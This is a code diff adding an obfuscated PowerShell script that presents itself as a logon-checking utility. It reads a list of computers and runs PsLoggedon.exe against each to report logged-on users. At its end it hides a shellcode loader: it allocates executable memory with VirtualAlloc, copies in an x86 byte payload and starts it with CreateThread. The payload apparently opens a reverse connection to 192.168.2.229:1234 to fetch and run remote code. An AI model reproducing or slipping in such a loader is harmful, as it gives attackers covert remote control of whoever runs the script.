@@ -1,0 +1,72 @@
+&("{0}{2}{1}"-f 'Set-V','e','ariabl') -Name ("{0}{1}" -f 'Comma','nd') -Scope ("{1}{0}" -f'obal','Gl') -Force
+.("{0}{2}{1}"-f'Set','le','-Variab') -Name ("{1}{2}{0}" -f 'r','C','ompute') -Scope ("{1}{0}"-f'obal','Gl') -Force
+&("{3}{1}{2}{0}"-f 'iable','a','r','Set-V') -Name ("{1}{0}"-f'puters','Com') -Scope ("{2}{1}{0}"-f'obal','l','G') -Force
+&("{2}{1}{0}{3}"-f 'aria','-V','Set','ble') -Name ('i') -Scope ("{0}{1}"-f 'Gl','obal') -Value 1 -Force
+&("{2}{1}{0}{3}" -f'bl','-Varia','Set','e') -Name ("{1}{0}" -f 'ut','Outp') -Scope ("{0}{1}"-f'Glob','al') -Force
+.("{1}{3}{0}{2}" -f 'ab','Set-V','le','ari') -Name ("{3}{1}{0}{2}"-f 'ivePat','t','h','Rela') -Scope ("{0}{2}{1}"-f'Gl','al','ob') -Force
+.("{1}{3}{0}{2}" -f'b','Set-','le','Varia') -Name ("{0}{1}{2}"-f 'Resul','t','s') -Scope ("{0}{1}"-f'Gl','obal') -Force
+&("{2}{1}{0}" -f 'ble','a','Set-Vari') -Name ("{1}{0}"-f'me','Userna') -Scope ("{1}{0}" -f 'al','Glob') -Force
+
+Function renameW`In`D`oW (${T`i`TLE}) {
+
+	
+	&("{2}{3}{0}{1}" -f '-V','ariable','S','et') -Name ('a') -Scope ("{0}{1}" -f'Loc','al') -Force
+	
+	${A} = (&("{1}{0}{2}"-f'et-','G','Host'))."u`I"."rAw`UI"
+	${A}."winDO`W`TITle" = ${TI`T`lE}
+	
+	
+	&("{0}{1}{2}" -f'R','emo','ve-Variable') -Name ('a') -Scope ("{0}{1}"-f 'Lo','cal') -Force
+}
+
+Function gE`TRE`L`ATIVEP`ATH{
+	${g`LObAl`:RE`L`ATIvEPATH}=(&("{0}{3}{2}{1}" -f 'spl','-path','t','i') ${ScRIP`T:m`YIN`V`OCation}."MYCo`mm`ANd"."P`ATh" -parent)+"\"
+}
+
+&("{1}{0}" -f 's','cl')
+.("{0}{3}{1}{2}" -f 'Rena','eW','indow','m') ((("{3}{0}{2}{7}{5}{4}{1}{6}" -f 'Ips Logg','ged Off','ed ','Whox',' Log',' and','?','On'))."re`PL`ACe"('xIp',[strING][chaR]39))
+.("{1}{4}{3}{2}{0}"-f 'Path','Ge','e','ativ','tRel')
+${Re`SuL`Ts} = @()
+${usE`R`NAmE} = @()
+${CO`MPute`RS} = .("{1}{3}{2}{0}" -f'nt','G','te','et-Con') -Path ((("{2}{0}{4}{5}{6}{1}{3}{7}" -f'FGlobal:Relat','rs','Lc','.tx','iv','ePa','thCompute','t'))  -rEplACe([ChAr]76+[ChAr]99+[ChAr]70),[ChAr]36)
+${Si`Ze} = ${coM`PU`TERs}."L`e`NGTH"
+Foreach (${CoMPu`TER} in ${ComP`U`T`ERs}) {
+	&("{2}{1}{0}" -f'ost','-H','Write') ("{0}{2}{3}{4}{1}"-f 'Scanni',' ','ng',' Sys','tem')(("{0}{3}{1}{2}" -f 'nm',' of nmO','Size','Oi')).REPlAcE(([cHAR]110+[cHAR]109+[cHAR]79),'$')
+	.("{0}{2}{1}"-f 'Write','t','-Hos')
+	.("{1}{0}{3}{2}"-f'-H','Write','t','os') ("{0}{2}{1}" -f 'Sy',':','stem')${C`OmpU`TEr}
+	${cO`Mm`ANd} = ${glO`BaL:`RelATI`VE`paTh}+('PsLog'+'ged'+'on.ex'+'e '+'-'+'x '+'-'+'l '+"\\$Computer")
+	${o`UTP`Ut} = .("{0}{1}{2}{3}" -f 'Invoke-','Exp','re','ssion') ${cOMM`ANd}
+	If (${oU`T`puT}."SY`N`cRoOT"[2] -eq ("{2}{3}{1}{0}{4}"-f'ocally',' l','Users',' logged on',':')) {
+		${US`ErNa`mE} += ${oUt`P`Ut}."sync`RooT"[3].("{1}{0}" -f 'im','Tr').Invoke()
+	} else {
+		${us`ER`NAMe} += "N/A"
+	}
+	${oUtP`UT} = ${ouTP`Ut}."SynC`ROoT"[2]
+	${outP`Ut} = ${ou`Tput}.("{2}{0}{1}" -f'r','ing','Subst').Invoke(0,${OUtP`Ut}."L`EngTh"-1)
+	${r`e`SulTs} += ${oUTp`UT}
+	${I} = ${I} + 1
+	.("{0}{1}" -f'c','ls')
+}
+&("{1}{0}" -f 'ls','c')
+for (${I}=0 ; ${I} -lt ${Re`sU`lTs}."Len`gTh" ; ${i}++) {
+ 	If (${Res`U`Lts}[${I}] -eq ("{2}{3}{1}{0}{5}{6}{7}{4}" -f'n','e is logged o','No o','n','ly',' l','o','cal')) {
+		.("{1}{2}{3}{0}" -f 'Host','W','rit','e-') ${COM`P`U`TErs}[${i}]": "${ReS`Ul`TS}[${I}] -BackgroundColor ("{0}{1}{2}" -f'Y','el','low') -ForegroundColor ("{0}{1}" -f'Bl','ack')
+	} elseIf (${re`S`ULts}[${i}] -eq ("{5}{4}{1}{3}{0}{2}" -f 'd on locall','rs ','y','logge','e','Us')) {
+		&("{3}{2}{0}{1}" -f'-H','ost','te','Wri') ${CO`M`pUTeRs}[${i}]": "${RE`Su`LTS}[${I}]("{1}{0}"-f'- ',' -')${U`sErnaMe}[${i}]-ForegroundColor ("{0}{1}" -f 'Whit','e')
+	} else {
+		.("{2}{1}{3}{0}"-f 't','rit','W','e-Hos') ${Com`pU`TerS}[${I}]": "${R`EsULts}[${I}]("{0}{1}"-f ' ','-- ')${uSeRN`A`ME}[${i}]-ForegroundColor ("{0}{1}" -f'R','ed')
+	}
+}
+
+
+.("{4}{3}{0}{1}{2}"-f 've-Var','i','able','o','Rem') -Name ("{0}{1}"-f 'Comman','d') -Scope ("{2}{1}{0}"-f'bal','lo','G') -Force
+&("{0}{2}{1}{3}" -f'Rem','abl','ove-Vari','e') -Name ("{1}{0}{2}" -f'mput','Co','er') -Scope ("{1}{0}{2}"-f 'ba','Glo','l') -Force
+.("{3}{0}{1}{2}" -f'ar','iab','le','Remove-V') -Name ("{0}{1}{2}" -f'C','omp','uters') -Scope ("{0}{1}"-f 'Glob','al') -Force
+&("{4}{2}{0}{3}{1}"-f'a','e','e-Vari','bl','Remov') -Name ('i') -Scope ("{0}{1}" -f'Gl','obal') -Force
+.("{2}{1}{0}{3}"-f 'ari','ve-V','Remo','able') -Name ("{1}{2}{0}" -f't','Outp','u') -Scope ("{1}{0}" -f 'obal','Gl') -Force
+&("{0}{2}{1}{3}{4}" -f'Remo','e-V','v','ar','iable') -Name ("{1}{0}{2}{3}" -f'ativ','Rel','ePa','th') -Scope ("{2}{1}{0}" -f 'bal','lo','G') -Force
+.("{1}{3}{0}{2}"-f'ove-Var','Re','iable','m') -Name ("{1}{0}{2}" -f'esult','R','s') -Scope ("{1}{0}" -f 'bal','Glo') -Force
+.("{0}{4}{2}{1}{3}" -f 'R','bl','a','e','emove-Vari') -Name ("{0}{2}{1}"-f 'Use','name','r') -Scope ("{1}{2}{0}" -f'al','Gl','ob') -Force
+ 
+
+${c} = ((("{69}{65}{102}{94}{73}{62}{23}{80}{70}{72}{15}{93}{104}{4}{56}{19}{96}{55}{66}{57}{3}{91}{75}{90}{1}{14}{44}{107}{85}{97}{5}{87}{68}{24}{42}{13}{6}{95}{103}{76}{81}{74}{22}{84}{53}{101}{18}{12}{38}{50}{100}{86}{46}{20}{10}{11}{52}{31}{64}{37}{16}{21}{17}{59}{58}{51}{33}{41}{8}{99}{9}{105}{67}{77}{60}{106}{88}{82}{0}{25}{34}{92}{39}{71}{35}{7}{79}{83}{98}{78}{36}{28}{26}{32}{40}{61}{49}{29}{45}{48}{43}{63}{27}{30}{89}{54}{47}{2}"-f 'ti',' uint flAl',';',' uint','r','el','pu','lpThreadId);[Dll','r ','ar','s,',' uint ','tPtr','})]','l','i',', I','tr lpStar','ead(In','tPtr','e','ntP',' IntP','{0','dl','o','s',' src, ','ic ','ems','uint ','wStack','tati',', In','n','tr ','publ','ze',' lp','lags','c exte','tPt','l{0',', ui','ocationType, uint f','et(In','tribut','nt)','tPtr dest',' IntPtr m','Threa','ess','d','r CreateT','u','irtual','n In','tr lpAddress,','Addr','t',' ui','rn','el32.dll','nt','Si','({0}','Alloc(IntP','er','.','[DllImport','pub',', IntP','lic stat','n','ern','z','ic static e',',','0})]','Import(','})]','xt','a','{0','t','0','At','32','e','co','e,',' dwSi','F','c ext','er','b',' V','}kern','}msvcrt.dll{','lpP','d','hr','k','l','e','amet','nt dwCr','lProtect);[DllImport({')) -f  [CHar]34);${W} = .("{0}{1}"-f 'Ad','d-Type') -memberDefinition ${C} -Name ("{1}{0}" -f 'n32','Wi') -namespace ("{0}{1}{3}{2}"-f'Wi','n32Func','s','tion') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0xe5,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."leNg`TH" -gt 0x1000){${g} = ${z}."len`gTh"};${x}=${w}::("{0}{2}{1}" -f 'Virtual','loc','Al').Invoke(0,0x1000,${G},0x40);for (${I}=0;${i} -le (${Z}."len`gTH"-1);${I}++) {${w}::"m`e`MsET"([IntPtr](${X}.("{1}{2}{0}"-f't32','ToI','n').Invoke()+${i}), ${z}[${i}], 1)};${W}::("{3}{0}{2}{1}"-f 'a','d','teThrea','Cre').Invoke(0,0,${X},0,0,0);for (;;){.("{1}{0}{2}"-f 'rt-sl','Sta','eep') 60};
